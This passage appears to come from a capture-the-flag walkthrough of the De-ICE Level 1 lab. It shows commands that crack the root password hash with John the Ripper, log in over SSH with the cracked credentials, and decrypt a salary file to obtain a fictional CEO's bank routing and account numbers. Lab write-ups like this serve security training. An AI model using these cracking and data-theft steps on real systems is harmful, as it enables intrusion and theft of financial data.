<span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$PASSWD</span><span class="s2">&quot;</span> <span class="p">|</span> tee passwd.txt
/usr/sbin/unshadow passwd.txt shadow.txt &gt; unshadow.txt
<span class="c1"># rockyou-75.txt doesn&#39;t find the password</span>
/usr/sbin/john --rules --wordlist<span class="o">=</span><span class="s2">&quot;rockyou-75.txt&quot;</span> unshadow.txt
<span class="hll"><span class="c1"># pw list 3.txt finds password</span>
</span><span class="hll">/usr/sbin/john --rules --wordlist<span class="o">=</span><span class="s2">&quot;pw list 3.txt&quot;</span> unshadow.txt
</span><span class="hll">/usr/sbin/john --show unshadow.txt
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># root:tarot:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash</span>
</span></pre></div>
</div>
<p>Now we have root access with password “tarot”.</p>
</div>
<div class="section" id="getting-the-ceo-s-bank-account-information">
<h3>3.8.3.4. Getting the CEO’s bank account information<a class="headerlink" href="#getting-the-ceo-s-bank-account-information" title="Permalink to this headline">¶</a></h3>
<p>To obtain the CEO’s bank account information: <code class="docutils literal"><span class="pre">ssh</span> <span class="pre">aadams&#64;de-ice1.com</span></code>, <code class="docutils literal"><span class="pre">su</span> <span class="pre">-</span> <span class="pre">root</span></code>, then find and decrypt the CEO’s bank account information:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>sshpass -p <span class="s2">&quot;nostradamus&quot;</span> ssh aadams@de-ice1.com
su - root    <span class="c1"># password &quot;tarot&quot;</span>
<span class="nb">cd</span> ~ftp/incoming
ls -l    <span class="c1"># see salary_dec2003.csv.enc</span>
<span class="hll"><span class="c1"># &quot;openssl enc -d&quot; decrypts</span>
</span><span class="hll"><span class="c1">#   &quot;openssl enc -h&quot; lists possible ciphers, 1st is aes-128-cbc</span>
</span><span class="hll"><span class="c1">#   use root password for decryption</span>
</span><span class="hll">openssl enc -aes-128-cbc -d -pass pass:tarot -in salary_dec2003.csv.enc -out salary_dec2003.csv
</span>head salary_dec2003.csv
</pre></div>
</div>
<p>This outputs the desired information:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">,Employee ID,Name,Salary,Tax Status,Federal Allowance (From W-4),State Tax (Percentage),Federal Income Tax (Percentage based on Federal Allowance),Social Security Tax (Percentage),Medicare Tax (Percentage),Total Taxes Withheld (Percentage),&quot;Insurance Deduction (Dollars)&quot;,&quot;Other Regular Deduction(Dollars)&quot;,&quot;Total Regular Deductions (Excluding taxes, in dollars)&quot;,&quot;Direct Deposit Info Routing Number&quot;,&quot;Direct Deposit Info Account Number&quot;</span>
<span class="hll"><span class="go">,1,Charles E. Ophenia,&quot;$225,000.00&quot;,1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$360.00,$500.00,$860.00,183200299,1123245</span>
</span></pre></div>
</div>
<p>So the CEO’s (routing number,account number) is (183200299,1123245) and we are done.</p>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="underdist3.html" class="btn btn-neutral float-right" title="3.9. Underdist: 3" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="de-ice2.html" class="btn btn-neutral" title="3.7. De-ICE Level 2" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.2',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>